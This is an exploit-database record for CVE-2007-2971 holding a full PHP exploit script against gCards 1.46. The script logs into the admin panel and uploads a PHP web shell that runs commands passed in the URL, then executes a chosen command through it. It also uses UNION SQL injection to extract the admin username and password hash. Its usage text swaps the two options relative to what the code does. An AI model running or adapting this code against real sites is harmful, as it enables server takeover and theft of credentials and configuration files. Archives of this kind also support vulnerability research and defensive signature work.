{
  "id": "3988",
  "title": "gCards 1.46 - SQL Injection / Remote Code Execution",
  "cve": "CVE-2007-2971",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?php\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nif ($argc<4) {\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"        gCards <= 1.46 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_gcards.php [OPTION] [HOST] [PATH] ([USER] [PASS] [COMMAND])\\r\\n\\r\\n\";\r\nprint \"[OPTION]  = 0 = SQL Injection (Admin user & hash retrieval)\\r\\n\";\r\nprint \"            1 = Remote Code Execution\\r\\n\";\r\nprint \"[HOST] \t  = Target server's hostname or ip address\\r\\n\";\r\nprint \"[PATH] \t  = Path where gCards is located\\r\\n\";\r\nprint \"[USER] \t  = Admin's username\\r\\n\";\r\nprint \"[PASS] \t  = Admin's password\\r\\n\";\r\nprint \"[COMMAND] = Command to execute\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_gcards.php 0 victim.com /gcards/\\r\\n\";\r\nprint \"     w4ck1ng_gcards.php 1 victim.com /gcards/ username password \\\"ls -lia\\\"\\r\\n\";\r\nprint \"     w4ck1ng_gcards.php 1 victim.com /gcards/ username password \\\"cat ../config.php\\\"\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\ndie;\r\n}\r\n\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$exploit = $argv[1];\r\n$host = $argv[2];\r\n$path = $argv[3];\r\n$user = $argv[4];\r\n$pass = $argv[5];\r\n$cmd  = $argv[6];\r\n$cmd  = urlencode($cmd);\r\n$port=80;$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nif ($exploit==0){\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"        gCards <= 1.46 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n    echo \"\\r\\n[+] Logging in...\";\r\n\r\n    $data=\"username=\" . $user;\r\n    $data.=\"&userpass=\"  . $pass;\r\n    $packet =\"POST \" . $path . \"admin/admin.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"Authentication failed\")){die(\"...Failed!\\r\\n\"); exit();}\r\n    else{echo \"...Successful!\\r\\n\";}\r\n    $temp=explode(\"Set-Cookie: \",$html);\r\n    $temp2=explode(\" \",$temp[1]);\r\n    $cookie=$temp2[0];\r\n\r\n    $packet =\"GET \" . $path . \"admin/cards.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    $temp3=explode(\"<option value=\\\"\",$html);\r\n    $temp4=explode(\"\\\"\",$temp3[1]);\r\n\r\n    $catid=$temp4[0];\r\n    if ($catid==\"\") {$catid=1;}\r\n\r\n    echo \"[+] Uploading shell...\";\r\n$data='-----------------------------7d73d8371d06d2\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n250000\r\n-----------------------------7d73d8371d06d2\r\nContent-Disposition: form-data; name=\"cardname\"\r\n\r\nw4ck1ng\r\n-----------------------------7d73d8371d06d2\r\nContent-Disposition: form-data; name=\"catid\"\r\n\r\n'.$catid.'\r\n-----------------------------7d73d8371d06d2\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"w4ck1ng.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"<font color=\\\"#FFFFFF\\\">...Silentz</font>\";ini_set(\"max_execution_time\",0);passthru($_GET[cmd]);echo \"<font color=\\\"#FFFFFF\\\">...Silentz</font>\";?>\r\n-----------------------------7d73d8371d06d2\r\nContent-Disposition: form-data; name=\"userthumb\"; filename=\"w4ck1ng.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"<font color=\\\"#FFFFFF\\\">...Silentz</font>\";ini_set(\"max_execution_time\",0);passthru($_GET[cmd]);echo \"<font color=\\\"#FFFFFF\\\">...Silentz</font>\";?>\r\n-----------------------------7d73d8371d06d2--\r\n';\r\n    $packet =\"POST \" . $path . \"admin/upload.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d73d8371d06d2\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\";\r\n    $packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n\r\n    sendpacketii($packet);\r\n    if (strstr($html,\"successfully\"))\r\n    {echo \"...Successful!\\r\\n\";}\r\n    else\r\n    {die(\"...Failed!\\r\\n\"); exit();}\r\n    \r\n    $packet =\"GET \" . $path . \"admin/cards.php HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    $temp=explode(\"w4ck1ng.php\",$html);\r\n    $temp2=explode(\"<td>\",$temp[count($temp)-2]);\r\n    $temp=$temp2[count($temp2)-1];\r\n    $newfile=$temp.\"w4ck1ng.php\";\r\n    if ($newfile==\"\") {die(\"For some reason, exploit failed...\");}\r\n   \r\n    echo \"[+] Show time!!!\\r\\n\\r\\n\";\r\n    $packet =\"GET \" . $path . \"images/\".$newfile.\"?cmd=\" . $cmd . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"...Silentz\"))\r\n     {\r\n       $temp=explode(\"...Silentz</font>\",$html);\r\n       $temp2=explode(\"<font color=\\\"#FFFFFF\\\">\",$temp[1]);\r\n       echo \"===============================================================\\r\\n\\r\\n\";\r\n       echo $temp2[0];\r\n       echo \"\\r\\n===============================================================\\r\\n\";\r\n       echo \"\\r\\n[+] Shell...http://\" .$host.$path. \"images/\" . $newfile . \"\\r\\n\";\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\n\tprint \"            \t\t        ...Silentz\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n       die;\r\n     }\r\n\r\nelse{die(); exit();}}\r\n\r\nif($exploit==1){\r\n\r\n    $sql = \"getnewsitem.php?newsid=999/**/UNION/**/SELECT/**/0,username,username,username,0/**/FROM/**/gc_cardusers/**/WHERE/**/userid=1/*\";\r\n    $packet =\"GET \" . $path . $sql . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    $temp = explode(\"<td><span class=\\\"bold\\\">\",$html);\r\n    $temp2 = explode(\"</span><br>\",$temp[1]);\r\n    $username = $temp2[0];\r\n\r\n    if($username){\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"        gCards <= 1.46 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n    echo \"[+] Admin User: \" . $username . \"\\r\\n\";}\r\n\r\n\r\n    $sql = \"getnewsitem.php?newsid=999/**/UNION/**/SELECT/**/0,userpass,userpass,userpass,0/**/FROM/**/gc_cardusers/**/WHERE/**/userid=1/*\";\r\n    $packet =\"GET \" . $path . $sql . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n\r\n    sendpacketii($packet);\r\n    $temp = explode(\"<td><span class=\\\"bold\\\">\",$html);\r\n    $temp2 = explode(\"</span><br>\",$temp[1]);\r\n    $password = $temp2[0];\r\n\r\n    if($username){\r\n\r\n    echo \"[+] Admin Hash: \" . $password . \"\\r\\n\";\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\n\tprint \"            \t\t        ...Silentz\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n }\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-05-25]",
  "url": "https://www.exploit-db.com/exploits/3988"
}